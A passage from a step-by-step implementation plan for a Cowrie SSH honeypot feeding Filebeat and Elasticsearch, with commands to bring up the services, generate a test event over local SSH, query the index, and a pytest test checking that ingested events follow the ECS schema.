- [ ] **Step 4: Bring the new services up**

```bash
docker compose up -d cowrie filebeat && docker compose logs --tail=20 filebeat
```

Expected: Filebeat logs show a connection to Elasticsearch and no template errors. `docker compose ps` shows both running.

- [ ] **Step 5: Generate a real event and confirm it lands**

Log into the honeypot and run a command. Any password is accepted by default Cowrie.

```bash
ssh -p 2222 -o StrictHostKeyChecking=no root@127.0.0.1
```

At the honeypot shell type `uname -a`, then `exit`. Then query Elasticsearch:

```bash
curl -s 'http://localhost:9200/honeypot-events/_search?q=event.action:cowrie.command.input&size=1&pretty'
```

Expected: a hit whose `_source.process.command_line` is `uname -a`, `_source.session.id` is set, and `_source.honeypot.id` is `cowrie-01`. If the document is missing, check `docker compose logs filebeat` for a `strict_dynamic_mapping_exception` — that names the unmapped field, which you then add to the pipeline's `remove` list or the index template.

- [ ] **Step 6: Write the live ingest test**

Create `backend/tests/test_live_ingest.py`. It asserts the pipeline works end to end against whatever is in the index, and skips cleanly if no live traffic has been generated yet.

```python
import pytest

from app.config import get_settings
from app.es.client import get_es


@pytest.mark.asyncio
async def test_live_cowrie_events_are_ecs_shaped() -> None:
    settings = get_settings()
    result = await get_es().search(
        index=settings.es_index,
        query={
            "bool": {
                "filter": [
                    {"term": {"event.action": "cowrie.command.input"}},
                    {"term": {"labels.seeded": False}},
                ]
            }
        },
        size=1,
    )
    hits = result["hits"]["hits"]
    if not hits:
        pytest.skip("no live Cowrie traffic ingested yet; run the SSH step first")

    src = hits[0]["_source"]
    assert src["event"]["category"] == "process"
    assert src["process"]["command_line"]
    assert src["session"]["id"]
    assert src["honeypot"]["id"] == "cowrie-01"
```

- [ ] **Step 7: Run the test**

Run: `cd backend && pytest tests/test_live_ingest.py -v`
Expected: PASS (or SKIP if Step 5 was not performed — but Step 5 was performed, so PASS).

- [ ] **Step 8: Checkpoint**

Run: `cd backend && pytest -v`
Expected: all tests pass.

Confirm and report: SSH into Cowrie on port 2222 works, a typed command appears in Elasticsearch as an ECS document within a few seconds, no `strict_dynamic_mapping_exception` in Filebeat logs. **Do not run any git command.**

---
